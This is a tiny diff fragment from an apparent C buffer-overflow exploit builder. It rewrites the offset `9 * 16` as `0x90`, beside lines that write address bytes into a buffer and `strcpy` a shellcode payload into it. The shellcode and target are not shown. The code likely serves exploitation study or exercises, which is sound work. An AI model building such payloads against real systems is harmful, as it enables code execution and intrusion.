@@ -33,7 +33,7 @@ int main(int argc, char ** argv) {
         buffer[24 + 1] = a[1];
         buffer[24 + 2] = a[2];
         buffer[24 + 3] = a[3];
-        int delta = 9 * 16;
+        int delta = 0x90;
         
         strcpy(buffer+delta, shellcode);
 
